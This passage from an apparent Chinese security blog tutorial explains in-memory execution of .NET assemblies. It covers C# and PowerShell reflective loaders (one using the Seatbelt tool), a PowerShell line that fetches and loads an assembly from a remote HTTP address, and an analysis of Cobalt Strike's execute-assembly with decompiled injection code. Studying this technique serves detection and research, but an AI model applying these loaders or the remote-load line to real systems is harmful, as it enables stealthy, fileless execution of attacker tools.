class-name\"><span class=\"token keyword\">string</span></span> base64str <span class=\"token operator\">=</span> <span class=\"token string\">\"egrdersg\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//这里省略一下</span>\n            <span class=\"token class-name\"><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></span> buffer <span class=\"token operator\">=</span> Convert<span class=\"token punctuation\">.</span><span class=\"token function\">FromBase64String</span><span class=\"token punctuation\">(</span>base64str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token class-name\">Assembly</span> assembly <span class=\"token operator\">=</span> Assembly<span class=\"token punctuation\">.</span><span class=\"token function\">Load</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>          \n            <span class=\"token class-name\">Type</span> type <span class=\"token operator\">=</span> assembly<span class=\"token punctuation\">.</span><span class=\"token function\">GetType</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"TestApplication.aaa\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">MethodInfo</span> method <span class=\"token operator\">=</span> type<span class=\"token punctuation\">.</span><span class=\"token function\">GetMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bbb\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">Object</span> obj <span class=\"token operator\">=</span> assembly<span class=\"token punctuation\">.</span><span class=\"token function\">CreateInstance</span><span class=\"token punctuation\">(</span>method<span class=\"token punctuation\">.</span>Name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>            \n            method<span class=\"token punctuation\">.</span><span class=\"token function\">Invoke</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>如果不需要指定需要调用的方法，调用main函数即可：</p>\n<div class=\"language-csharp\" data-ext=\"cs\" data-title=\"cs\"><pre class=\"language-csharp\"><code><span class=\"token keyword\">using</span> <span class=\"token namespace\">System</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Reflection</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token namespace\">TestApplication</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Program</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n\n            <span class=\"token class-name\"><span class=\"token keyword\">string</span></span> base64str <span class=\"token operator\">=</span> <span class=\"token string\">\"xxxxxx\"</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//此处省略一万字</span>\n            <span class=\"token class-name\"><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></span> buffer <span class=\"token operator\">=</span> Convert<span class=\"token punctuation\">.</span><span class=\"token function\">FromBase64String</span><span class=\"token punctuation\">(</span>base64str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token class-name\">Assembly</span> assembly <span class=\"token operator\">=</span> Assembly<span class=\"token punctuation\">.</span><span class=\"token function\">Load</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">MethodInfo</span> method <span class=\"token operator\">=</span> assembly<span class=\"token punctuation\">.</span>EntryPoint<span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// 想要指定参数</span>\n            <span class=\"token class-name\"><span class=\"token keyword\">object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></span> parameters <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"-a\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"-b\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n            method<span class=\"token punctuation\">.</span><span class=\"token function\">Invoke</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> parameters<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>1.3. 示例代码</h3>\n<h4>c#</h4>\n<div class=\"language-csharp\" data-ext=\"cs\" data-title=\"cs\"><pre class=\"language-csharp\"><code><span class=\"token keyword\">using</span> <span class=\"token namespace\">System</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>IO</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Reflection</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">namespace</span> <span class=\"token namespace\">MemoryLoadApplication</span>\n<span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">class</span> <span class=\"token class-name\">Program</span>\n    <span class=\"token punctuation\">{</span>\n\n        <span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token keyword\">string</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></span> args<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n\n            <span class=\"token class-name\"><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></span> buffer <span class=\"token operator\">=</span> File<span class=\"token punctuation\">.</span><span class=\"token function\">ReadAllBytes</span><span class=\"token punctuation\">(</span><span class=\"token string\">@\"C:\\Users\\Black Sheep\\source\\repos\\Seatbelt\\Seatbelt\\bin\\Release\\Seatbelt.exe\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\"><span class=\"token keyword\">string</span></span> base64str <span class=\"token operator\">=</span> Convert<span class=\"token punctuation\">.</span><span class=\"token function\">ToBase64String</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\"><span class=\"token keyword\">string</span></span> dir <span class=\"token operator\">=</span> Directory<span class=\"token punctuation\">.</span><span class=\"token function\">GetCurrentDirectory</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            buffer <span class=\"token operator\">=</span> Convert<span class=\"token punctuation\">.</span><span class=\"token function\">FromBase64String</span><span class=\"token punctuation\">(</span>base64str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            File<span class=\"token punctuation\">.</span><span class=\"token function\">WriteAllText</span><span class=\"token punctuation\">(</span><span class=\"token interpolation-string\"><span class=\"token string\">$\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token expression language-csharp\">dir</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">\\\\base64.txt\"</span></span><span class=\"token punctuation\">,</span> base64str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">Assembly</span> assembly <span class=\"token operator\">=</span> System<span class=\"token punctuation\">.</span>Reflection<span class=\"token punctuation\">.</span>Assembly<span class=\"token punctuation\">.</span><span class=\"token function\">Load</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            assembly<span class=\"token punctuation\">.</span>EntryPoint<span class=\"token punctuation\">.</span><span class=\"token function\">Invoke</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token constructor-invocation class-name\"><span class=\"token keyword\">object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></span> <span class=\"token punctuation\">{</span> args <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h4>powershell</h4>\n<p>powershell访问.net程序集的代码比较简单</p>\n<div class=\"language-powershell\" data-ext=\"powershell\" data-title=\"powershell\"><pre class=\"language-powershell\"><code><span class=\"token variable\">$base64</span> = <span class=\"token string\">\"TVqQAAMAAAAEAAA(前面生成的base64编码的程序集)\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$bins</span>  = <span class=\"token namespace\">[System.Convert]</span>::FromBase64String<span class=\"token punctuation\">(</span><span class=\"token variable\">$base64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$invoke</span> = <span class=\"token namespace\">[System.Reflection.Assembly]</span>::Load<span class=\"token punctuation\">(</span><span class=\"token variable\">$bins</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token namespace\">[System.Console]</span>::WriteLine<span class=\"token punctuation\">(</span><span class=\"token variable\">$invoke</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$args</span> = <span class=\"token function\">New-Object</span> <span class=\"token operator\">-</span>TypeName System<span class=\"token punctuation\">.</span>Collections<span class=\"token punctuation\">.</span>ArrayList\n\n<span class=\"token namespace\">[string[]]</span><span class=\"token variable\">$strings</span> = <span class=\"token string\">\"-group=all\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"-full\"</span>\n\n<span class=\"token variable\">$args</span><span class=\"token punctuation\">.</span>Add<span class=\"token punctuation\">(</span><span class=\"token variable\">$strings</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token variable\">$invoke</span><span class=\"token punctuation\">.</span>EntryPoint<span class=\"token punctuation\">.</span>Invoke<span class=\"token punctuation\">(</span><span class=\"token variable\">$N</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$args</span><span class=\"token punctuation\">.</span>ToArray<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>也可以远程加载</p>\n<div class=\"language-powershell\" data-ext=\"powershell\" data-title=\"powershell\"><pre class=\"language-powershell\"><code><span class=\"token variable\">$invoke</span> = <span class=\"token namespace\">[System.Reflection.Assembly]</span>::UnsafeLoadFrom<span class=\"token punctuation\">(</span><span class=\"token string\">\"http://192.168.0.125/base\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><h2>2. unmanaged代码内存加载.NET程序集</h2>\n<p><strong>(execute-assembly)</strong></p>\n<p>当不是用C#编写代码，但还是想要实现上面的操作时，例如Cobalt Strike 3.11中，加入了一个名为”execute-assembly”的命令，能够从内存中加载.NET程序集。<code>execute-assembly</code>功能的实现，必须使用一些来自.NET Framework的核心接口来执行.NET程序集口</p>\n<h3>2.1. 基础知识</h3>\n<p>CLR全称Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境</p>\n<p>CLR是.NET Framework的主要执行引擎，作用之一是监视程序的运行：</p>\n<ul>\n<li>在CLR监视之下运行的程序属于”托管的”(managed)代码</li>\n<li>不在CLR之下、直接在裸机上运行的应用或者组件属于”非托管的”(unmanaged)的代码</li>\n</ul>\n<p><strong>Hosting</strong> (Unmanaged API Reference) 用于将.NET 程序集加载到任意程序中的API（https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/ ）本次主要关注两种方式，按照.net版本区分：</p>\n<ul>\n<li>\n<p><strong>ICorRuntimeHost Interface</strong>：https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/icorruntimehost-interface</p>\n<p>支持v1.0.3705, v1.1.4322, v2.0.50727和v4.0.30319</p>\n</li>\n<li>\n<p><strong>ICLRRuntimeHost Interface</strong>：https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/iclrruntimehost-interface</p>\n<p>支持v2.0.50727和v4.0.30319，在.NET Framework 2.0中，ICLRRuntimeHost用于取代ICorRuntimeHost，在实际程序开发中，很少会考虑.NET Framework 1.0，所以两个接口都可以使用</p>\n</li>\n</ul>\n<h4>重要接口描述</h4>\n<p><code>ICLRRuntimeHost</code>、<code>ICLRRuntimeInfo</code> 以及<code>ICLRMetaHost</code> ，以下是这三个接口的简要描述</p>\n<p><a href=\"https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/iclrruntimehost-interface\" target=\"_blank\" rel=\"noopener noreferrer\">ICLRRuntimeHost Interface - .NET Framework | Microsoft Learn</a></p>\n<ul>\n<li><strong>ICLRMetaHost</strong>: 这个接口用于在托管代码中获取关于加载的CLR（Common Language Runtime，.NET Framework的核心组件）的信息。基本上，它提供了一个入口点，允许我们枚举加载到进程中的所有CLR版本，并为特定版本的CLR获取<code>ICLRRuntimeInfo</code>接口。</li>\n<li><strong>ICLRRuntimeInfo</strong>: 一旦你有了表示特定CLR版本的<code>ICLRRuntimeInfo</code>接口，你可以用它来获取CLR运行时的其他接口，例如<code>ICLRRuntimeHost</code>。这个接口还允许你判断这个特定版本的CLR是否已经被加载到进程中。</li>\n<li><strong>ICLRRuntimeHost</strong>: 这是执行.NET程序集所必需的主要接口。通过这个接口，你可以启动托管代码的执行环境，加载.NET程序集，并执行它。具体来说，它的<code>ExecuteInDefaultAppDomain</code>方法可以用来加载和执行.NET程序集。</li>\n</ul>\n<p>综上所述，要在非托管代码（如C++）中执行.NET程序集，你需要首先使用<code>ICLRMetaHost</code>来确定哪个CLR版本已加载或可用。然后使用<code>ICLRRuntimeInfo</code>来为这个CLR版本获取<code>ICLRRuntimeHost</code>。最后用<code>ICLRRuntimeHost</code>来加载和执行.NET程序集。</p>\n<h3>2.2. CS内存执行流程分析</h3>\n<p>在Cobalt Strike的代码中找到BeaconConsole.java文件，定位到“execute-assembly”命令处。通过简单分析这段代码可以知道，当解析到用户执行“execute-assembly”命令后，会先验证”pZ“和”F“关键字来判断要执行的.net程序集是否带有参数（具体如何判断请查看CommandParser类）。判断完成使用CommandParser类的popstring方法将execute-assembly的参数赋值给变量，然后调用ExecuteAssembly方法执行程序集。</p>\n<figure><a href=\"https://0pen1.github.io/2022/02/09/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF.assets/image-20220114182430780-16443915545351.png\" target=\"_blank\" rel=\"noopener noreferrer\"></a><figcaption>image-20220114182430780</figcaption></figure>\n<p>我们继续跟进ExecuteAssembly方法，ExecuteAssembly方法有两个参数，第一个参数为待执行的.net程序集路径，第二个参数为.net程序集执行需要的参数。执行这个方法时先将要执行的.net程序集从硬盘读取并加载到PE解析器（PEParser）中，随后判断加载的PE文件是否为.net程序集，如果是.net程序集则创建ExecuteAssemblyJob实例并调用spawn方法。</p>\n<figure><a href=\"https://0pen1.github.io/2022/02/09/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF.assets/image-20220114182256752.png\" target=\"_blank\" rel=\"noopener noreferrer\"></a><figcaption>image-20220114182256752</figcaption></figure>\n<p>接下来进入spawn方法，可以看到是<strong>通过反射DLL的方法，将invokeassembly.dll注入到进程当中</strong>（这块也不知道咋实现的），并且设置任务号为70（x86版本）或者71（x64）。注入的invokeassembly.dll在其内存中创建CLR环境，然后通过管道再将C#可执行文件读取到内存中,最后执行。</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">spawn</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> var1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> var2 <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDLLContent</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">int</span> var3 <span class=\"token operator\">=</span> <span class=\"token class-name\">ReflectiveDLL</span><span class=\"token punctuation\">.</span><span class=\"token function\">findReflectiveLoader</span><span class=\"token punctuation\">(</span>var2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>var3 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n         <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>tasker<span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Could not find reflective loader in \"</span> <span class=\"token operator\">+</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDLLName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n         <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ReflectiveDLL</span><span class=\"token punctuation\">.</span><span class=\"token function\">is64</span><span class=\"token punctuation\">(</span>var2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">ignoreToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n               <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>builder<span class=\"token punctuation\">.</span><span class=\"token function\">setCommand</span><span class=\"token punctuation\">(</span><span class=\"token number\">71</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n               <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>builder<span class=\"token punctuation\">.</span><span class=\"token function\">setCommand</span><span class=\"token punctuation\">(</span><span class=\"token number\">88</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n         <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">ignoreToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>builder<span class=\"token punctuation\">.</span><span class=\"token function\">setCommand</span><span class=\"token punctuation\">(</span><span class=\"token number\">70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>builder<span class=\"token punctuation\">.</span><span class=\"token function\">setCommand</span><span class=\"token punctuation\">(</span><span class=\"token number\">87</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">}</span>\n\n         var2 <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">fix</span><span class=\"token punctuation\">(</span>var2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>tasker<span class=\"token punctuation\">.</span><span class=\"token function\">obfuscatePostEx</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            var2 <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">_obfuscate</span><span class=\"token punctuation\">(</span>var2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">}</span>\n\n         var2 <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">setupSmartInject</span><span class=\"token punctuation\">(</span>var2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> var4 <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getArgument</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>builder<span class=\"token punctuation\">.</span><span class=\"token function\">addShort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getCallbackType</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>builder<span class=\"token punctuation\">.</span><span class=\"token function\">addShort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getWaitTime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>builder<span class=\"token punctuation\">.</span><span class=\"token function\">addInteger</span><span class=\"token punctuation\">(</span>var3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>builder<span class=\"token punctuation\">.</span><span class=\"token function\">addLengthAndString</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getShortDescription</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>builder<span class=\"token punctuation\">.</span><span class=\"token function\">addInteger</span><span class=\"token punctuation\">(</span>var4<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>builder<span class=\"token punctuation\">.</span><span class=\"token function\">addString</span><span class=\"token punctuation\">(</span>var4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>builder<span class=\"token punctuation\">.</span><span class=\"token function\">addString</span><span class=\"token punctuation\">(</span>var2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> var5 <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>builder<span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>tasker<span class=\"token punctuation\">.</span><span class=\"token function\">task</span><span class=\"token punctuation\">(</span>var1<span class=\"token punctuation\">,</span> var5<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDescription</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getTactic</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">}</span>\n   <span class=\"token punctuation\">}</span>\n</code></pre></div><figure><a href=\"https://0pen1.github.io/2022/02/09/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF.assets/image-20220209135538841.png\" target=\"_blank\" rel=\"noopener noreferrer\"></a><figcaption>image-20220209135538841</figcaption></figure>\n<figure><a href=\"https://0pen1.github.io/2022/02/09/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF.assets/image-20220117192352767.png\" target=\"_blank\" rel=\"noopener noreferrer\"></a><figcaption>image-20220117192352767</figcaption></figure>\n<p>总结一下，Cobalt Strike内存加载执行.net程序集大概的过程就是，首先spawn一个进程并传输invokeassembly.dll注入到该进程，invokeassembly.dll实现了在其内存中创建CLR环境，然后通过管道再将C#可执行文件读取到内存中,最后执行。</p>\n<p><strong>那么invokeassembly.dll内部是如何操作的呢？</strong></p>\n<h3>2.3. 硬盘加载执行.NET程序集</h3>\n<ol>\n<li>初始化ICLRMetaHost接口。</li>\n<li>通过ICLRMetaHost获取ICLRRuntimeInfo接口。</li>\n<li>通过ICLRRuntimeInfo将 CLR 加载到当前进程并返回运行时接口ICLRRuntimeHost指针。</li>\n<li>通过ICLRRuntimeHost.Start()初始化CLR。</li>\n<li>通过ICLRRuntimeHost.EecuteInDefaultAppDomain执行指定程序集(硬盘上)。</li>\n</ol>\n<h4>示例代码</h4>\n<p><strong>unmanaged.cpp</strong></p>\n<div class=\"language-cpp\" data-ext=\"cpp\" data-title=\"cpp\"><pre class=\"language-cpp\"><code><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;metahost.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">pragma</span> <span class=\"token expression\"><span class=\"token function\">comment</span><span class=\"token punctuation\">(</span>lib<span class=\"token punctuation\">,</span> </span><span class=\"token string\">\"mscoree.lib\"</span><span class=\"token expression\"><span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    ICLRMetaHost<span class=\"token operator\">*</span> iMetaHost <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n    ICLRRuntimeInfo<span class=\"token operator\">*</span> iRuntimeInfo <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n    ICLRRuntimeHost<span class=\"token operator\">*</span> iRuntimeHost <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">//初始化环境</span>\n    <span class=\"token function\">CLRCreateInstance</span><span class=\"token punctuation\">(</span>CLSID_CLRMetaHost<span class=\"token punctuation\">,</span> IID_ICLRMetaHost<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPVOID<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>iMetaHost<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    iMetaHost<span class=\"token operator\">-&gt;</span><span class=\"token function\">GetRuntime</span><span class=\"token punctuation\">(</span>L<span class=\"token string\">\"v4.0.30319\"</span><span class=\"token punctuation\">,</span> IID_ICLRRuntimeInfo<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPVOID<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>iRuntimeInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    iRuntimeInfo<span class=\"token operator\">-&gt;</span><span class=\"token function\">GetInterface</span><span class=\"token punctuation\">(</span>CLSID_CLRRuntimeHost<span class=\"token punctuation\">,</span> IID_ICLRRuntimeHost<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPVOID<span class=\"token 